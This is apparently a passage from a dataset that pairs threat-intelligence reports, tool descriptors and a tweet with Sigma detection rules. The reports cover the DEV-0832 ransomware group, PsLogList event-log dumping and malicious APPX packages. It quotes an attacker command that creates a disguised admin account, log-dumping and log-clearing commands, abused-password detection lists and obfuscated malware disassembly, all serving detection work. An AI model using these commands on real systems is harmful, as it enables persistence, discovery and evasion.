'Admin_<redacted>' is a placeholder for the actual username that has been obscured for security. This command is indicative of malicious activity, as it suggests the creation of accounts designed to blend in as administrative accounts, allowing persistence without the use of malware.\nTranscription: net user /add Admin_<redacted> PASSWORD123123!\n```\n\n*Figure 5. Attacker command to create accounts*\n\nMonitoring newly created accounts can help identify this type of suspicious activity that does not rely on launching malware for persistence in the environment.\n\n#### Exploitation of privilege escalation vulnerabilities\n\nIn August 2022, Microsoft security researchers identified one file during a DEV-0832 intrusion indicating that the group has incorporated an exploit for the disclosed, patched security flaw CVE-2022-24521 (Windows Common Log File System (CLFS) logical-error vulnerability). Microsoft released a patch in April 2022. The DEV-0832 file spawns a new *cmd.exe* process with system privileges.\n\nAccording to public reporting, DEV-0832 has also incorporated exploits for the PrintNightmare vulnerability to escalate privileges in a domain. Combined with the CVE-2022-24521 exploit code, it is likely that DEV-0832, like many other adversaries, quickly incorporates available exploit code for disclosed vulnerabilities into their toolset to target unpatched systems.\n\n#### Lateral movement with valid accounts\n\nAfter gaining credentials, DEV-0832 frequently moves laterally within a network using Remote Desktop Protocol (RDP). And as previously mentioned, DEV-0832 has also used valid credentials to interact with remote network shares over Server Message Block (SMB) where they stage ransomware payloads and PowerShell scripts.\n\n---\n\n### Data exfiltration\n\nIn one known intrusion, DEV-0832 operators exfiltrated hundreds of gigabytes of data by launching their PowerShell script, which was staged on a network share. The script contained hardcoded attacker-owned IP addresses and searched for wide-ranging, non-targeted keywords ranging from financial documents to medical information, while excluding files containing keywords such as varied antivirus product names or file artifact extensions. Given the wide range of keywords included in the script, it is unlikely that DEV-0832 regularly customizes it for each target.\n\nMicrosoft suspects that DEV-0832 uses legitimate tools Rclone and MegaSync for data exfiltration as well; many ransomware actors leverage these tools, which provide capabilities to upload files to cloud storage. DEV-0832 also uses file compression tools to collect data from compromised devices.\n\n---\n\n### Mitigations\n\nApply these mitigations to reduce the impact of this threat:\n\n- Use device discovery to increase your visibility into your network by finding unmanaged devices on your network and onboarding them to Microsoft Defender for Endpoint.\n- Use Microsoft Defender Vulnerability Management to assess your current status and deploy any updates that might have been missed.\n- Utilize Microsoft Defender Firewall, intrusion prevention devices, and your network firewall to prevent RPC and SMB communication among endpoints whenever possible. This limits lateral movement as well as other attack activities.\n- Turn on cloud-delivered protection in Microsoft Defender Antivirus or the equivalent for your antivirus product to cover rapidly evolving attacker tools and techniques. Cloud-based machine learning protections block a huge majority of new and unknown variants.\n- Turn on tamper protection features to prevent attackers from stopping security services.\n- Run endpoint detection and response (EDR) in block mode so that Microsoft Defender for Endpoint can block malicious artifacts, even when your non-Microsoft antivirus doesn’t detect the threat or when Microsoft Defender Antivirus is running in passive mode. EDR in block mode works behind the scenes to remediate malicious artifacts that are detected post-breach.\n- Enable investigation and remediation in full automated mode to allow Microsoft Defender for Endpoint to take immediate action on alerts to resolve breaches, significantly reducing alert volume.\n- LSA protection is enabled by default on new Windows 11 devices, hardening the platform against credential dumping techniques. LSA PPL protection will further restrict access to memory dumps making it hard to obtain credentials.\n- Refer to Microsoft’s blog Ransomware as a service: Understanding the cybercrime gig economy and how to protect yourself for recommendations on building strong credential hygiene and other robust measures to defend against ransomware.\n\nMicrosoft customers can turn on attack surface reduction rules to prevent several of the infection vectors of this threat. These rules, which can be configured by any administrator, offer significant hardening against ransomware attacks. In observed attacks, Microsoft customers who had the following rules enabled were able to mitigate the attack in the initial stages and prevented hands-on-keyboard activity:\n\n- Block process creations originating from PsExec and WMI commands\n- Block executable files from running unless they meet a prevalence, age, or trusted list criterion\n- Use advanced protection against ransomware\n- Block credential stealing from the Windows local security authority subsystem (lsass.exe)\n\n---\n\n### Detection details\n\n#### Microsoft Defender Antivirus\n\nMicrosoft Defender Antivirus detects DEV-0832’s Vice Society-branded Zeppelin variant as the following malware:\n\n- Ransom:Win32/VSocCrypt\n- Trojan:PowerShell/VSocCrypt\n- Ransom:Linux/ViceSociety\n\nOther commodity ransomware variants previously leveraged by DEV-0832 are detected as:\n\n- Behavior:Win32/Ransomware!Quantum.A\n- Behavior:Win32/Quantum.AA\n- Ransom:Win32/Zeppelin\n- Ransom:Win32/Blackcat\n\n*SystemBC* and *PortStarter* are detected as:\n\n- Behavior:Win32/SystemBC\n- Trojan:Win32/SystemBC\n- Backdoor:Win64/PortStarter\n\nSome pre-ransomware intrusion activity used in multiple campaigns by various activity groups can be detected generically. During identified DEV-0832 activity, associated command line activity was detected with generic detections, including:\n\n- Behavior:Win32/OfficeInjectingProc.A\n- Behavior:Win32/PsexecRemote.E\n- Behavior:Win32/SuspRemoteCopy.B\n- Behavior:Win32/PSCodeInjector.A\n- Behavior:Win32/REnamedPowerShell.A\n\n#### Microsoft Defender for Endpoint\n\nThe following Microsoft Defender for Endpoint alerts can indicate threat activity on your network:\n\n- DEV-0832 activity group\n- ‘VSocCrypt’ ransomware was prevented\n\nThe following alerts might also indicate threat activity associated with this threat. These alerts, however, can be triggered by unrelated threat activity.\n\n- Use of living-off-the-land binary to run malicious code\n- Potential SystemBC execution via Windows Task Scheduler\n- Suspicious sequence of exploration activities\n- Process memory dump\n- Suspicious behavior by cmd.exe was observed\n- Suspicious remote activity\n- Suspicious access to LSASS service\n- Suspicious credential dump from NTDS.dit\n- File backups were deleted\n- System recovery setting tampering",
    "sigma_rule": {
      "title": "Weak or Abused Passwords In CLI",
      "id": "91edcfb1-2529-4ac2-9ecc-7617f895c7e4",
      "status": "test",
      "description": "Detects weak passwords or often abused passwords (seen used by threat actors) via the CLI.\nAn example would be a threat actor creating a new user via the net command and providing the password inline\n",
      "references": [
        "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/espionage-asia-governments",
        "https://thedfirreport.com/2022/09/26/bumblebee-round-two/",
        "https://www.microsoft.com/en-us/security/blog/2022/10/25/dev-0832-vice-society-opportunistic-ransomware-campaigns-impacting-us-education-sector/",
        "https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-09-14",
      "modified": "2024-02-23",
      "tags": [
        "attack.defense-evasion",
        "attack.execution"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains": [
            "123456789",
            "123123qwE",
            "Asd123.aaaa",
            "Decryptme",
            "P@ssw0rd!",
            "Pass8080",
            "password123",
            "test@202"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate usage of the passwords by users via commandline (should be discouraged)",
        "Other currently unknown false positives"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_weak_or_abused_passwords.yml",
    "id": "577"
  },
  {
    "url": "https://github.com/3CORESec/MAL-CL/tree/master/Descriptors/Sysinternals/PsLogList",
    "markdown": "# PsLogList\n\n## Table of Contents\n\n- PsLogList\n  - Table of Contents\n  - Acknowledgement(s)\n  - Description\n  - Versions History\n  - File Metadata\n  - Common CommandLine\n  - Threat Actor Ops (TAOps)\n  - Common Process Trees\n  - Default Install Location\n  - DFIR Artifacts\n  - Examples In The Wild\n  - Documentation\n  - Blogs / Reports References\n  - ATT&CK Techniques\n  - Telemetry\n  - Detection Validation\n  - Detection Rules\n  - LOLBAS / GTFOBins References\n\n## Acknowledgement(s)\n\n- 3CORESec - @3CORESec\n- Nasreddine Bencherchali - @nas_bench\n\n## Description\n\n> **PsLogList lets you dump the contents of an Event Log on the local or a remote computer** - MSDN\n\n## Versions History\n\n- TBD\n\n## File Metadata\n\n- TBD\n\n## Common CommandLine\n\n- Note that most of the time the process is renamed but the flags are the same.\n- Note that the \"/\" can be used instead of the \"-\" when calling the flags.\n\n```\npsloglist.exe -accepteula -x security -s -a <current_date>\n\npsloglist.exe security -d [NumOfDays] /accepteula\n```\n\n## Threat Actor Ops (TAOps)\n\n- TBD\n\n## Common Process Trees\n\n- TBD\n\n## Default Install Location\n\n- PsLogList is a downloadable portable utility so no installation is required to execute it.\n- The Sysinternals suite is available in the Microsoft Store. If downloaded from there then the `PsLogList` utility will be installed in the following location:\n\n```\nC:\\Program Files\\WindowsApps\\Microsoft.SysinternalsSuite_[Version]\\Tools\\PsLogList.exe\n```\n\n## DFIR Artifacts\n\n- TBD\n\n## Examples In The Wild\n\n- Github Gist - winlogfinder\n\n## Documentation\n\n- Microsoft Docs - PsLogList\n- SS64.com - Windows CMD - PsLogList\n\n## Blogs / Reports References\n\n- nccgroup - Abusing cloud services to fly under the radar\n- Cybereason - DeadRinger: Exposing Chinese Threat Actors Targeting Major Telcos\n\n## ATT&CK Techniques\n\n- T1087 - Account Discovery\n\n## Telemetry\n\n- Security Event ID 4688 - A new process has been created\n- Sysmon Event ID 1 - Process creation\n- PsSetCreateProcessNotifyRoutine/Ex\n- ETW - Microsoft-Windows-Kernel-Process - Event ID 1 - ProcessStart\n\n## Detection Validation\n\n- TBD\n\n## Detection Rules\n\n- TBD\n\n## LOLBAS / GTFOBins References\n\n- None",
    "sigma_rule": {
      "title": "Suspicious Use of PsLogList",
      "id": "aae1243f-d8af-40d8-ab20-33fc6d0c55bc",
      "status": "test",
      "description": "Detects usage of the PsLogList utility to dump event log in order to extract admin accounts and perform account discovery or delete events logs",
      "references": [
        "https://web.archive.org/web/20231124132223/https://research.nccgroup.com/2021/01/12/abusing-cloud-services-to-fly-under-the-radar/",
        "https://www.cybereason.com/blog/deadringer-exposing-chinese-threat-actors-targeting-major-telcos",
        "https://github.com/3CORESec/MAL-CL/tree/master/Descriptors/Sysinternals/PsLogList",
        "https://twitter.com/EricaZelic/status/1614075109827874817"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2021-12-18",
      "modified": "2024-03-05",
      "tags": [
        "attack.discovery",
        "attack.t1087",
        "attack.t1087.001",
        "attack.t1087.002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "OriginalFileName": "psloglist.exe"
          },
          {
            "Image|endswith": [
              "\\psloglist.exe",
              "\\psloglist64.exe"
            ]
          }
        ],
        "selection_cli_eventlog": {
          "CommandLine|contains": [
            " security",
            " application",
            " system"
          ]
        },
        "selection_cli_flags": {
          "CommandLine|contains|windash": [
            " -d",
            " -x",
            " -s",
            " -c",
            " -g"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Another tool that uses the command line switches of PsLogList",
        "Legitimate use of PsLogList by an administrator"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_sysinternals_psloglist.yml",
    "id": "591"
  },
  {
    "url": "https://twitter.com/EricaZelic/status/1614075109827874817",
    "markdown": "# Post\n\nJan 14, 2023\n\nMy nightly Windows reading is never boring:\n\n```image\nDescription: The image is a webpage screenshot about \"PsLogList v2.81,\" a utility from a Resource Kit that enables the dumping of Event Log contents from both local and remote computers. It highlights that PsLogList is similar to elogdump but additionally allows access to remote systems beyond current security credentials. The page includes options for downloading PsTools and displays the publication details.\nTranscription: |\n  **PsLogList v2.81**\n  \n  Article · 03/23/2021 · 2 minutes to read · 4 contributors\n  \n  By Mark Russinovich\n  \n  Published: March 05, 2019\n  \n  Download PsTools (2.7 MB)\n  \n  **Introduction**\n  \n  The Resource Kit comes with a utility, elogdump, that lets you dump the contents of an Event Log on the local or a remote computer. PsLogList is a clone of elogdump except that PsLogList lets you login to remote systems in situations your current set of security credentials would not permit access to the Event Log, and PsLogList retrieves message strings from the computer on which the event log you view resides.\n```\n\n## Comment\n\nJan 14, 2023\n\n```image\nDescription: The image displays a command usage guide for the tool 'psloglist', which is part of the Sysinternals suite. It shows the syntax for using the command, including various parameters such as '@file', '-a', '-b', '-c', and '-d', along with their descriptions. The parameter '-c' is highlighted, indicating its function to 'Clear the event log after displaying.' This image is informative as it provides detailed technical information relevant to cyber threat intelligence.\nTranscription: |\n  usage: psloglist [- ] [\\\\computer,[computer,...] | @file [-u username [-p password]]] [-s [-t delimiter]] [-m #-n #-h #-d #-w][-c][-x][-a mm/dd/yy][-b mm/dd/yy][-f filter][-i ID[,ID,...] | -e ID[,ID,...]] [-o event source[,event source[,...]]] [-q event source[,event source[,...]]] [-l event log file] <eventlog>\n  \n  Parameter     Description\n  @file         Execute the command on each of the computers listed in the file.\n  -a            Dump records timestamped after specified date.\n  -b            Dump records timestamped before specified date.\n  -c            Clear the event log after displaying.\n  -d            Only display records from previous n days.\n```\n\n## Comment\n\nJan 14, 2023\n\ncc @filip_dragovic 😂 since this uses the registry, I wonder if it will pass redirection guard\n\n```image\nDescription: The image displays a section from a guide or documentation regarding the usage of the 'PendMoves' applet, which is part of Sysinternals. It shows command-line output indicating the version of the tool, its copyright information, and an example execution of the command 'pendmoves'. The output specifies a source file path ('C:\\Config.Msi\\3ec7bbbf.rbf') and indicates that the target action is 'DELETE', suggesting that this file is scheduled for deletion at the next reboot.\nTranscription: |\n  C:\\\\pendmoves\n  PendMove v1.2\n  Copyright (C) 2013 Mark Russinovich\n  Sysinternals - www.sysinternals.com\n  \n  Source: C:\\\\Config.Msi\\\\3ec7bbbf.rbf\n  Target: DELETE\n```",
    "sigma_rule": {
      "title": "Suspicious Use of PsLogList",
      "id": "aae1243f-d8af-40d8-ab20-33fc6d0c55bc",
      "status": "test",
      "description": "Detects usage of the PsLogList utility to dump event log in order to extract admin accounts and perform account discovery or delete events logs",
      "references": [
        "https://web.archive.org/web/20231124132223/https://research.nccgroup.com/2021/01/12/abusing-cloud-services-to-fly-under-the-radar/",
        "https://www.cybereason.com/blog/deadringer-exposing-chinese-threat-actors-targeting-major-telcos",
        "https://github.com/3CORESec/MAL-CL/tree/master/Descriptors/Sysinternals/PsLogList",
        "https://twitter.com/EricaZelic/status/1614075109827874817"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2021-12-18",
      "modified": "2024-03-05",
      "tags": [
        "attack.discovery",
        "attack.t1087",
        "attack.t1087.001",
        "attack.t1087.002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "OriginalFileName": "psloglist.exe"
          },
          {
            "Image|endswith": [
              "\\psloglist.exe",
              "\\psloglist64.exe"
            ]
          }
        ],
        "selection_cli_eventlog": {
          "CommandLine|contains": [
            " security",
            " application",
            " system"
          ]
        },
        "selection_cli_flags": {
          "CommandLine|contains|windash": [
            " -d",
            " -x",
            " -s",
            " -c",
            " -g"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Another tool that uses the command line switches of PsLogList",
        "Legitimate use of PsLogList by an administrator"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_sysinternals_psloglist.yml",
    "id": "592"
  },
  {
    "url": "https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/",
    "markdown": "# Inside Malicious Windows Apps for Malware Deployment\n\n**Date:** July 14, 2022\n\nThis article discusses Windows Apps – Windows applications packaged into *APPX* or *MSIX* packages – as a medium to deploy malware. Though not as widely abused as other infection vectors, there have been a number of recent high profile attacks that use Windows Apps.\n\n- **November, 2021:** BazarBackdoor was distributed in the form of an *APPX* package.\n- **December, 2021:** Emotet malware was distributed by abusing a spoofing vulnerability in the Windows App Installer, software that installs Windows Apps.\n- **January, 2022:** Malicious Windows Apps in *APPX* format masquerading as critical browser updates were used to drop Magniber ransomware.\n- **February, 2022:** Windows Apps laced with the Electron Bot malware were uploaded to the Microsoft Store, a trusted library of Microsoft-certified packaged Windows Apps.\n\nSince Microsoft’s announcement that Office applications will by default disable the execution of Office macros in the context of documents that originate from untrusted sources, there has been an uptick in malicious actors using alternative mediums for deploying malware such as Windows Apps and Windows shortcut *LNK* files. Despite Microsoft recently rolling back the decision to disable by default Office macro execution, these media complement malicious macros and remain a threat to watch for.\n\nPrevious research on malicious Windows Apps focused on concrete system infections involving particular instances of such Apps. This article complements previous research by taking a generic perspective. I take an *APPX* package that malicious actors have used to deploy malware as a running example and provide:\n\n- A summarizing overview of the layout and content of *APPX* packages (*APPX* packages are structurally very similar to the alternative *MSIX* packages and the two Windows App packaging formats share the same deployment infrastructure).\n- An overview of selected activities that the Windows system conducts when a user installs a malicious *APPX* package.\n\nThis enables a better understanding of what occurs on a system when a user falls prey to an attack that involves a malicious Windows App – from the operating system activities at first user interaction with the file to the malware deployment that the file triggers.\n\nFor Windows to install an *APPX* package, whether malicious or not, the system first has to establish trust in the package. Microsoft provides the Microsoft Store to Windows users as a library of certified packaged Windows Apps. These packages are digitally counter-signed by Microsoft. Windows trusts by default *APPX* packages that originate from the Windows Store. However, when the Windows App sideloading feature is enabled, users can install *APPX* packages that do not originate from the Microsoft Store as well, that is, packages that are not counter-signed by Microsoft. Such are the majority of the malicious *APPX* packages that the security community has observed in attacks.\n\nIn this article, we will dig into how malicious *APPX* packages can be installed on a Windows 10 system, with a focus on how Windows establishes trust in an *APPX* package. I focus on this aspect since trust is a crucial part of the Windows App installation process. This process is what ultimately deploys malware on a system. I will use the malicious *APPX* package *edge_update.appx* (SHA1: *e491af786b5ee3c57920b79460da351ccf8f6f6b*) as a running example.\n\n## What Does a Malicious Windows App Look Like?\n\nThe `edge_update.appx` *APPX* package is signed with a code signing certificate issued to Foresee Consulting Inc. and a root certificate issued by DigiCert Trusted Root G4. Windows systems trust DigiCert root certificates and they are placed in the *Trusted Root Certification Authorities* certificate store.\n\nFigure 1 depicts the certificate chain of the digital signature of `edge_update.appx` before a Certificate Authority revoked the certificate.\n\n```image\nAlt: Figure 1: The certificate chain of the digital signature of *edge_update.appx* prior certificate revocation\nDescription: The image displays a certificate verification path for a digital signature. It shows the hierarchy of the certificate chain, starting from the root certificate 'DigiCert Trusted Root G4,' followed by a code signing certificate issued to 'Foresee Consulting Inc.' The path indicates that the digital signature is authenticated up to a trusted root authority, which is relevant for understanding the trustworthiness of the malicious Windows app discussed in the surrounding text.\nTranscription: |\n  Certificate\n  \n  General\n  Details\n  Certification Path\n  \n  Certification path\n  - DigiCert Trusted Root G4\n    - DigiCert Trusted G4 Code Signing RSA4096 SHA384 2021 CA1\n      - Foresee Consulting Inc.\n```\n\n*APPX* packages are ZIP archive files that store the executable files that implement the packaged Windows App and additional files. Figure 2 depicts the content of `edge_update.appx`. The `eediwjus` directory stores the malicious Windows App that the executable files `eediwjus.exe` and `eediwjus.dll` implement. `eediwjus.exe` is a .NET Windows App (see Figure 3) that invokes the `mhjpfzvitta` function from `eediwjus.dll`. This function executes malicious code that is heavily control-flow obfuscated with unconditional jumps (see Figure 4). The analysis of the malicious code is out of the scope of this article.\n\n```image\nAlt: Figure 2: The content of *edge_update.appx*\nDescription: The image displays a directory listing of files within a malicious APPX package, specifically located in the path `C:\\Users\\<user>\\malicious_appx\\`. It shows the file names, their sizes, and timestamps of last modifications. The top section lists general files associated with the APPX package, including `AppxBlockMap.xml`, `AppxManifest.xml`, and `AppxSignature.p7x`, along with the malicious directory `eediwjus`. The bottom section provides a detailed view of the `eediwjus` directory, listing two executable files: `eediwjus.dll` and `eediwjus.exe`, along with their respective sizes.\nTranscription: |\n  Directory of C:\\Users\\<USER>\\malicious_appx\\\n  05/07/2022  12:47    <DIR>          .\n  05/07/2022  12:47    <DIR>          ..\n  29/12/2022  13:55    <DIR>          AppxBlockMap.xml\n  29/12/2022  13:55    <DIR>          AppxManifest.xml\n  29/12/2022  13:55    <DIR>          AppxMetadata\n  30/12/2022  12:47    <DIR>          AppxSignature.p7x\n                 2.439 AppxBlockMap.xml\n                 2.039 AppxManifest.xml\n                 8.342 AppxSignature.p7x\n                 2.216 resources.pri\n                 740  [Content_Types].xml\n                 [...]\n  \n  Directory of C:\\Users\\<USER>\\malicious_appx\\eediwjus\\\n  05/07/2022  12:47    <DIR>          .\n  05/07/2022  12:47    <DIR>          ..\n  29/12/2022  13:55         5.632 eediwjus.dll\n  29/12/2021  13:55         3.584 eediwjus.exe\n```\n\n```image\nAlt: Figure 3: The implementation of *eediwjus.exe*\nDescription: The image depicts a code snippet in C# that showcases a class named `eediwjus`. The code includes details such as the class definition, an import statement for a DLL named `eediwjus.dll`, and a method `mhjpfzvitta` that is declared as an external function. The `Main` method initializes a variable `lpBuffer` and calls the external function with this variable as an argument. The snippet is formatted with color coding to indicate different elements of the code, such as keywords and comments.\nTranscription: |\n  namespace eediwjus\n  {\n      // Token: 0x02000002 RID: 2\n      public class eediwjus\n      {\n          // Token: 0x06000001 RID: 1\n          [DllImport(\"eediwjus.dll\")]\n          private static extern void mhjpfzvitta(uint lpBuffer);\n  \n          // Token: 0x06000002 RID: 2 RVA: 0x00000250 File Offset: 0x00000250\n          private static void Main(string[] args)\n          {\n              uint lpBuffer = 5604U;\n              eediwjus.mhjpfzvitta(lpBuffer);\n          }\n      }\n  }\n```\n\n```image\nAlt: Figure 4: Control-flow obfuscated malicious code in *eediwjus.dll*\nDescription: The image displays a snippet of disassembled code, likely from the malicious executable `eediwjus.exe`. It shows various assembly language instructions, including push and jump operations, along with references to memory locations. The code is annotated with comments indicating cross-references to the function `mhjpfzvitta`, which is identified as part of the malicious behavior associated with this executable.\nTranscription: |\n  .text:0000000018000113F loc_18000113F:          ; CODE XREF: mhjpfzvitta+p\n  .text:0000000018000113F     push    rbp\n  .text:00000000180001140 loc_180001140:          ; CODE XREF: .text:00000000180001196\n  .text:00000000180001140     jmp     short loc_180001196\n  .text:00000000180001142 loc_180001142:         \n  .text:00000000180001142     push    r14\n  .text:00000000180001144 loc_180001144:          ; CODE XREF: .text:000000001800011F2\n  .text:00000000180001144     jmp     loc_1800011F2\n  .text:00000000180001146     db      83h, 99h, 21h\n  .text:00000000180001149 loc_18000114C:         \n  .text:0000000018000114C     lea     rdx, [rbp-8]\n  .text:0000000018000114C     jmp     loc_1800011E4\n  .text:00000000180001150     db      0F6h, 92h, 33h\n  .text:00000000180001153     db      7ch, 7dh\n  .text:00000000180001155 loc_18000115A:         \n  .text:0000000018000115A     mov     rbp, rsp\n  .text:0000000018000115D     jmp     short loc_1800011C9\n```\n\nIn addition to the files that implement a Windows App, an *APPX* package stores additional files, such as `AppxManifest.xml`, `AppxBlockMap.xml`, and `AppxSignature.p7x`.\n\n`AppxManifest.xml` is the package manifest, a file in XML (Extensible Markup Language) format that contains the information that Windows needs to deploy, display, and update a Windows App. This includes information about:\n\n- The publisher of the App, where the publisher is the entity that digitally signs the *APPX* package and that is responsible for the development and release of the Windows App.\n- Windows App properties, such as display name and logo.\n- Software dependencies and capabilities: The Windows system controls what system resources a Windows App can access with respect to the capabilities that the publisher has assigned to the App. System resources include the Internet, filesystem locations, and networking. In summary, Windows Apps execute in a sandboxed, access-restricted, environment for security reasons.\n\nFigure 5 depicts the content of `AppxManifest.xml` in the malicious `edge_update.appx`. The publisher of the Windows App is *Foresee Consulting Inc.*, the display name of the App is *Edge Update*, and the App has the capabilities `internetClient` and `runFullTrust`. The `internetClient` capability enables the malicious Windows App to download data from the Internet, probably a payload from an attacker-controlled endpoint.\n\n```image\nAlt: Figure 5: The content of *AppxManifest.xml* in *edge_update.appx* (trimmed for brevity)\nDescription: The image displays the content of the `AppxManifest.xml` file from the malicious `edge_update.appx` package. It includes XML code detailing the identity of the application, which is signed by Foresee Consulting Inc. The display name of the app is 'Edge Update', and it outlines several properties such as publisher information, version details, and resource requirements. Additionally, it highlights the app's capabilities, specifically 'internetClient' and 'runFullTrust', indicating that the application can access the internet and has full trust permissions within the Windows environment.\nTranscription: |\n  <?xml version=\"1.0\" encoding=\"utf-8\"?>\n  <Package xmlns=\"http://schemas.microsoft.com/appx/manifest/foundation/windows10\">\n    <Identity Name=\"3669e262-ec02-4e9d-bcbd-3d088b4afac9\" Publisher=\"CN=Foresee Consulting Inc., L=North York, S=Ontario, C=CA, SERIALNUMBER=1040913-1, OID.1.3.6.1.4.1.311.60.2.1.3=CA, OID.2.5.4.15=Private Organization\" Version=\"96.0.1072.0\" ProcessorArchitecture=\"neutral\" />\n    <Properties>\n      <DisplayName>Edge Update</DisplayName>\n      <PublisherDisplayName>Microsoft Inc</PublisherDisplayName>\n      <Logo>Images\\StoreLogo.png</Logo>\n    </Properties>\n    <Dependencies>\n      <TargetDeviceFamily Name=\"Windows.Universal\" MinVersion=\"10.0.14393.0\" MaxVersionTested=\"10.0.19041.0\" />\n      <TargetDeviceFamily Name=\"Windows.Desktop\" MinVersion=\"10.0.14393.0\" MaxVersionTested=\"10.0.19041.0\" />\n    </Dependencies>\n    <Resources>\n      <Resource Language=\"EN-US\" />\n    </Resources>\n    <Applications>\n      <Application Id=\"App\" Executable=\"eediwjus.exe\" EntryPoint=\"Windows.FullTrustApplication\">\n        <uap:SplashScreen Image=\"Images\\SplashScreen.png\" />\n        <uap:LockScreen BadgeLogo=\"Images\\BadgeLogo.png\" Notification=\"badgeAndTileText\" />\n      </Application>\n    </Applications>\n    <Capabilities>\n      <Capability Name=\"internetClient\" />\n      <rescap:Capability Name=\"runFullTrust\" />\n    </Capabilities>\n  </Package>\n```\n\n`AppxBlockMap.xml` is the package block map, a file in XML format that stores Base-64 encoded hash values of data blocks in the files that an *APPX* package archives. Windows uses these hashes to verify the data integrity of these files when installing an *APPX* package, a topic that I discuss further in this article.\n\nFigure 6 depicts the content of `AppxBlockMap.xml` in the malicious `edge_update.appx`. The `HashMethod` XML attribute specifies the hash algorithm for calculating the data block hash values in `AppxBlockMap.xml`. The `File` XML element specifies a file in the *APPX* package and the size of the file. The `Block` XML element specifies the hash value and the size of a single data block in the file. For example, a data block in `eediwjus.exe` that is 1304 bytes big has the SHA-256 hash value of *ad4f74c0c3ac37e6f1cf600a96ae203c38341d263dbac0741e602686794c4f5a* (in hexadecimal format).\n\n```image\nAlt: Figure 6: The content of *AppxBlockMap.xml* in *edge_update.appx* (trimmed for brevity)\nDescription: The image displays an XML structure representing the content of an *AppxBlockMap.xml* file from a malicious APPX package named `edge_update.appx`. It includes elements such as `HashMethod`, which specifies the hash algorithm used, and multiple `File` elements detailing individual files within the package. Each `File` entry lists attributes such as `File Name`, `Size`, and a corresponding `Block Hash`, which provides the SHA-256 hash of specific data blocks in the file.\nTranscription: |\n  <?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n  <BlockMap xmlns=\"http://schemas.microsoft.com/appx/2010/blockmap\" HashMethod=\"http://www.w3.org/2001/04/xmlenc#sha256\">\n    <File Name=\"eediwjus\\eediwjus.exe\" Size=\"3584\" LfhSize=\"51\">\n      <Block Hash=\"ru90WOsNh+bz2AK2lq4gPDg8H5YusB0HmAmhnIM1Io=\" Size=\"1304\"/>\n    </File>\n    <File Name=\"eediwjus\\eediwjus.dll\" Size=\"5632\" LfhSize=\"51\">\n      <Block Hash=\"9C0gbarmyAq2IwgfMgfef+MUu1Up14eJ3YarNeRsY=\" Size=\"4280\"/>\n    </File>\n    <File Name=\"resources.pri\" Size=\"2216\" LfhSize=\"43\"/>\n    <File Name=\"AppxManifest.xml\" Size=\"2039\" LfhSize=\"46\">\n      <Block Hash=\"kMExXuwujmFwXpesPEI17NjZsArZfVULhB9=\" Size=\"902\"/>\n    </File>\n  </BlockMap>\n```\n\n`AppxSignature.p7x` is the *APPX* package signature, a PKCS (Public-Key Cryptography Standards) #7 digital signature data in ASN.1 (Abstract Syntax Notation One) format. `AppxSignature.p7x` stores signature data, such as the certificate chain of the digital signature and the actual signed data. The signed data includes hashes of files in the APPX package, such as `AppxManifest.xml` and `AppxBlockMap.xml`. Figure 7 depicts the formatted content of `AppxSignature.p7x` in the malicious `edge_update.appx`.\n\n```image\nAlt: Figure 7: The content of *AppxSignature.p7x* in *edge_update.appx* (trimmed for brevity)\nDescription: The image shows the structured content of a digital signature in ASN.1 format, specifically detailing the certificate chain related to the `edge_update.appx` APPX package. It includes sequences with object identifiers for various components such as the signature algorithm (SHA-256), the signing context for Microsoft code signing, and the common names of the involved entities: DigiCert Trusted Root G4 and Foresee Consulting Inc. This representation is crucial for understanding the security validations tied to the digital signature of malicious Windows applications.\nTranscription: |\n  SEQUENCE (2 elem)\n      OBJECT IDENTIFIER 1.2.840.113549.1.7.2 signedData (PKCS #7)\n      [0] (0 elem)\n  SEQUENCE (5 elem)\n      INTEGER 1\n      SET (1 elem)\n          SEQUENCE (2 elem)\n              OBJECT IDENTIFIER 2.16.840.1.101.3.4.2.1 sha-256 (NIST Algorithm)\n              NULL\n      SEQUENCE (2 elem)\n          OBJECT IDENTIFIER 1.3.6.1.4.1.311.2.1.4 spcIndirectDataContext (Microsoft code signing)\n          [0] (1 elem)\n              OBJECT IDENTIFIER 2.5.4.3 commonName (X.520 DN component)\n              PrintableString DigiCert Trusted Root G4\n          [...]\n          OBJECT IDENTIFIER 2.5.4.3 commonName (X.520 DN component)\n              PrintableString DigiCert Trusted G4 Code Signing RSA4096 SHA384 2021 CA1\n          [...]\n          OBJECT IDENTIFIER 2.5.4.3 commonName (X.520 DN component)\n              PrintableString Foresee Consulting Inc.\n```\n\n## Is a Malicious Windows App Trustworthy?\n\nThe `AppxSvc` service (`Appx Deployment Service`), which the DLL (dynamic-link library) `%SystemRoot%\\System32\\appxdeploymentserver.dll` implements, orchestrates the installation of *APPX* packages. When a user installs an *APPX* package, the `AppxSvc` service verifies the data integrity of the package and verifies that the package satisfies certain trust criteria. Figure 8 depicts a simplified overview of the data integrity verification process that the `AppxSvc` service conducts.\n\n```image\nAlt: Figure 8: A simplified overview of the data integrity verification process that the *AppxSvc* service conducts\nDescription: The image is a flowchart depicting the data integrity verification process conducted by the `AppxSvc` service when installing an *APPX* package. It outlines the steps involved in verifying the package signature (`AppxSignature.p7x`), the verification of 